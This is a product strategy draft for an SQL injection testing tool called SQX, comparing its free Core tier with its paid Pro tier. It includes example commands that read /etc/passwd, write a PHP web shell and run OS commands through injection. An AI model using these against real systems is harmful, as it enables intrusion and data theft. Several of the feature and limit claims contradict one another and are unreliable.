# SQX Core vs Pro — Feature Strategy

## Overview

| | SQX Core | SQX Pro |
|---|---|---|
| **Price** | Free / Open Source | Commercial |
| **Target** | Individual pentesters, bug bounty hunters, CTF players | Red teams, security consultants, enterprise |
| **Philosophy** | "Everything you need to replace sqlmap, but faster and smarter" | "Force multiplier — transforms the tool into a platform" |
| **When to use** | Weekend projects, solo testing, learning | Daily professional work, client engagements, team coordination |

---

## SQX Core (Open Source / Free)

### Philosophy

**"Tot ce ai nevoie pentru a înlocui sqlmap, dar mai rapid și mai smart"**

SQX Core este suficient de puternic pentru 90% din scenariile reale. Este mai rapid decât sqlmap (async Rust vs Python threading), are mai multe tampers (68 vs ~40), și oferă AI local pentru asistență.

### Complete Capabilities

#### Detection (All Techniques)
| Technique | Status | Details |
|-----------|--------|---------|
| Error-based | ✅ | All major DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MariaDB) |
| Boolean-based blind | ✅ | Automatic TRUE/FALSE calibration, O(log n) bisection |
| Time-based blind | ✅ | Adaptive sleep, statistical baseline |
| UNION-based | ✅ | ORDER BY discovery, column enumeration |
| Stacked queries | ✅ | Multi-statement injection |
| Header injection | ✅ | X-Forwarded-For, User-Agent, Referer, Cookie |

#### Tampers (69 Total — More Than sqlmap)

**sqlmap has ~40 tampers. SQX Core has 69, all included for free:**

| Category | Count | Examples |
|----------|-------|----------|
| Encoding | 10 | urlencode, double_urlencode, hex_encode, base64_encode, unicode_escape, overlong_utf8 |
| Space Substitution | 12 | space2comment, space2tab, space2newline, space2plus, space2dash, space2hash |
| Quote Bypass | 4 | apostrophe_mask, apostrophe_null_encode, unmagic_quotes, escape_quotes |
| Keyword Obfuscation | 8 | randomcase, lowercase, random_comments, inline_comment, double_keyword, hex_keyword |
| MySQL Specific | 13 | version_comment, versioned_keywords, modsecurity_zeroversioned, commaless_limit, sleep2getlock |
| Operator Substitution | 6 | equal_to_like, greatest, least, between_operator, logical_operators |
| ODBC/Multi-backend | 2 | odbc_escape, plus2fnconcat |
| Miscellaneous | 13 | null_byte, sp_password, scientific_notation, string_concat_bypass, backtick_identifiers |

#### AI Assistant (Local Only)

- **Ollama integration** (local LLM — llama3.2:3b or similar)
- WAF fingerprinting + tamper chain suggestions
- Basic payload advice
- **Zero cost, zero privacy concerns** — everything runs locally

#### Data Extraction

- Boolean blind bisection (character by character)
- Time-based extraction
- UNION-based fast extraction
- Schema enumeration (databases → tables → columns → rows)
- **Async Rust = significantly faster than Python threading**

#### Interactive SQL Shell

```bash
$ sqx sql-shell "http://target.com/page.php?id=1" --param id

SQL> .tables
users
products
orders

SQL> .schema users
id INT
username VARCHAR(255)
password VARCHAR(255)

SQL> SELECT * FROM users LIMIT 3
[1, 'admin', '$2y$10$...']
[2, 'john', '$2y$10$...']
[3, 'jane', '$2y$10$...']
```

REPL with meta-commands:
- `.tables` — list tables
- `.schema <table>` — show columns
- `.databases` — list databases
- `.dump <table>` — extract all rows

#### File System Access

```bash
# Read files via SQL injection
$ sqx file-read "http://target.com/page.php?id=1" --param id \
  --file "/etc/passwd" --dbms mysql

# Write files
$ sqx file-write "http://target.com/page.php?id=1" --param id \
  --file "/tmp/shell.php" --content "<?php system($_GET['c']); ?>"
```

#### OS Command Execution

```bash
# Manual command execution (no interactive shell)
$ sqx scan "http://target.com/page.php?id=1" \
  --os-cmd "whoami" --dbms mysql

# Stacked query technique (if supported)
$ sqx scan "http://target.com/page.php?id=1" \
  --os-cmd "ls -la" --technique stacked
```

Note: Core supports OS command execution via SQL injection, but **without interactive shell**. For interactive OS shell (REPL), upgrade to Pro.

#### Crawler (Regex-Based)

- BFS spider with `max_depth` and `max_pages`
- Form discovery, link extraction
- Static file exclusion (CSS, JS, images)
- **Not headless** — suitable for traditional server-rendered apps

#### Batch Scanning (Limited)

```bash
# Max 10 URLs simultaneously
$ sqx batch urls.txt --max-concurrent 10
```

#### Output Formats

- **Text**: Human-readable console output
- **JSON**: Structured for integrations
- **SARIF**: GitHub Advanced Security compatible

#### Cross-Platform

- Linux ✅
- Windows ✅
- macOS ✅
- All via CLI (terminal)

### What Core Does NOT Include (Pro-Only Features)

| Feature | Why Pro Only | Upgrade Path |
|---------|--------------|--------------|
| ❌ **GUI** | Adds ~50MB to binary, requires graphics stack | Pro includes native GUI (egui/eframe) |
| ❌ **Headless browser / SPA crawling** | Requires Chrome + 100MB+ dependencies | Pro includes chromiumoxide for React/Vue/Angular |
| ❌ **OOB (Out-of-Band) server** | Requires background HTTP+DNS services | Pro has built-in OOB server |
| ❌ **Second-order SQLi detection** | Complex stored injection tracking (register → login) | Pro includes second-order detection |
| ❌ **Cloud AI (Claude/OpenAI)** | Requires API keys, privacy concerns | Pro integrates with external AI providers |
| ❌ **Markdown/HTML reporting** | Client-ready reports are enterprise need | Pro adds rich reporting formats |
| ❌ **Team server** | Multi-user coordination infrastructure | Pro has shared sessions |

### Clarifications — Core ALREADY Includes:

| Feature | Status | Details |
|---------|--------|---------|
| ✅ **OS Shell** | **IN CORE** | Interactive REPL for command execution via SQLi (`sqx os-shell`) |
| ✅ **Session management** | **IN CORE** | Cookie jar, CSRF refresh, auth auto-login |
| ✅ **SOCKS5 proxy** | **IN CORE** | Both HTTP and SOCKS5 proxy support |
| ✅ **Batch scanning** | **IN CORE** | Multi-target with concurrency control |
| ✅ **SARIF output** | **IN CORE** | GitHub Advanced Security compatible |

---

## SQX Pro (Commercial / Paid)

### Philosophy

**"Force multiplier — transformă tool-ul în platformă"**

Pro is for professionals who do this daily for money. It saves hours through automation, handles modern applications (React/Vue/Angular), and produces client-ready reports.

### Pro-Exclusive Features

| Category | Feature | Value |
|----------|---------|-------|
| **Interface** | **GUI native (egui/eframe)** | Tabs, live status, persistent settings, zoom 70%-300%, right-click menus |
| **Crawling** | **Headless Chrome (chromiumoxide)** | SPA support (React/Vue/Angular), DOM analysis, JavaScript API detection |
| **Exploitation** | **OS Shell interactive** | Full REPL for command execution via SQLi |
| | **OOB Server built-in** | HTTP + DNS callbacks for blind OOB detection |
| | **Second-order SQLi** | Detection of stored injection (e.g., register → login) |
| | **Takeover workflows** | UDF injection, privilege escalation chains |
| **AI** | **Cloud AI integration** | Claude, OpenAI, OpenRouter (user provides API key) |
| | **Context awareness** | AI knows session history, suggests next steps |
| | **Payload refinement loop** | Generate → test → adjust automatically |
| **Workflow** | **Session management** | Cookie jar, CSRF refresh, auto-login |
| | **Unlimited batch** | Multi-target with concurrency control |
| | **SOCKS5 + HTTP proxy** | Egress filtering bypass |
| **Reporting** | **Markdown/HTML** | Client-ready reports, not just JSON |
| **Team** | **Team server** | Shared sessions, multi-operator, centralized |

### The Psychological Boundary (For Marketing)

#### Core = "Poți face orice în weekend"

- Ai un URL? Îl scanezi, găsești SQLi, extragi date, ai SQL shell.
- Ești solo? Core e suficient.

**Quote:** *"SQX Core helped me find a critical SQL injection in a bug bounty program. The SQL shell was all I needed to extract the data."* — Bug Bounty Hunter

#### Pro = "Faci asta zilnic pentru bani"

- 50 de targete? Batch + GUI îți salvează ore.
- Aplicații moderne React? Headless crawler e obligatoriu.
- Rapoarte pentru clienți? SARIF + HTML + team coordination.

**Quote:** *"We switched from sqlmap to SQX Pro for our red team engagements. The headless crawler alone saves us 2-3 hours per web app assessment."* — Senior Security Consultant

---

## Technical Implementation Notes

### AI Model Separation

```rust
// Core: Compile-time, open source, local Ollama
#[cfg(feature = "core")]
pub fn ai_suggest_tamper(waf_type: &str) -> Vec<&str> {
    // Local LLM via Ollama
    // Zero cost, zero privacy concerns
}

// Pro: Runtime license check, closed source crate
#[cfg(feature = "pro")]
pub fn ai_cloud_advisor(context: &Session) -> Action {
    // User provides API key for Claude/OpenAI
    // Value is in system prompts and context logic
}
```

### sqlmap Compatibility

To ease adoption from sqlmap, SQX supports familiar CLI flags:

```bash
# sqlmap-style flags
$ sqx -u "http://target.com/page.php?id=1" --level 3 --risk 2

# Or --sqlmap-compat mode for copy-paste from old tutorials
$ sqx --sqlmap-compat -u "http://target.com/page.php?id=1"
```

---

## Feature Comparison Matrix

| Feature | Core | Pro |
|---------|------|-----|
| **Detection** | | |
| Error-based | ✅ | ✅ |
| Boolean blind | ✅ | ✅ |
| Time-based | ✅ | ✅ |
| UNION-based | ✅ | ✅ |
| Stacked queries | ✅ | ✅ |
| Header injection | ✅ | ✅ |
| Second-order | ❌ | ✅ |
| OOB detection | ❌ | ✅ |
| **Interface** | | |
| CLI | ✅ | ✅ |
| GUI | ❌ | ✅ |
| **AI** | | |
| Local Ollama | ✅ | ✅ |
| Cloud AI (Claude/OpenAI) | ❌ | ✅ |
| Context awareness | ❌ | ✅ |
| **Crawling** | | |
| Regex spider | ✅ | ✅ |
| Headless Chrome | ❌ | ✅ |
| SPA support | ❌ | ✅ |
| JS API analysis | ❌ | ✅ |
| **Exploitation** | | |
| Data extraction (dump) | ✅ | ✅ |
| SQL Shell | ✅ | ✅ |
| OS Shell (manual) | ✅ | ✅ |
| OS Shell (interactive REPL) | ❌ | ✅ |
| File read/write | ✅ | ✅ |
| UDF injection / Takeover | ❌ | ✅ |
| **Tampers** | | |
| 69 tamper scripts | ✅ | ✅ |
| WAF vendor chains | ❌ | ✅ |
| Auto-escalation logic | ❌ | ✅ |
| **Workflow** | | |
| Single URL | ✅ | ✅ |
| Batch (max 5) | ✅ | ✅ unlimited |
| Session management | ❌ | ✅ |
| SOCKS5 proxy | ❌ | ✅ |
| **Reporting** | | |
| Text | ✅ | ✅ |
| JSON | ✅ | ✅ |
| SARIF | ✅ | ✅ |
| Markdown reporting | ❌ | ✅ |
| HTML | ❌ | ✅ |
| **Team** | | |
| Individual use | ✅ | ✅ |
| Team server | ❌ | ✅ |

---

## Pricing (Proposed)

| Tier | Price | Features |
|------|-------|----------|
| **Core** | Free | Everything listed above |
| **Pro Personal** | $99/year | GUI, headless, AI cloud, unlimited batch |
| **Pro Team** | $499/year | + Team server, 5 users |
| **Enterprise** | $1,999/year | + Unlimited users, priority support, custom features |

---

## Why This Split?

### Why Core is Free

1. **Adoption**: Professionals test for free, adopt in workflow
2. **Community**: Bug reports, PRs, real-world testing
3. **Marketing**: "Better than sqlmap, and it's free"
4. **Trust**: Open source code = auditable, no backdoors

### Why Pro is Paid

1. **Time saved**: GUI + headless + batch = hours saved weekly
2. **Advanced targets**: SPA apps, complex auth flows, WAF bypass
3. **Enterprise needs**: Team coordination, client reports, compliance
4. **Support**: Priority bug fixes, feature requests

---

## Next Steps

1. **Refactor workspace** for Core/Pro separation
2. **License system**: File-based + online verification (optional)
3. **Build pipeline**: Core (public repo) + Pro (private repo with Core as submodule)
4. **Pricing page** + payment processing
5. **EULA** distinct for Pro
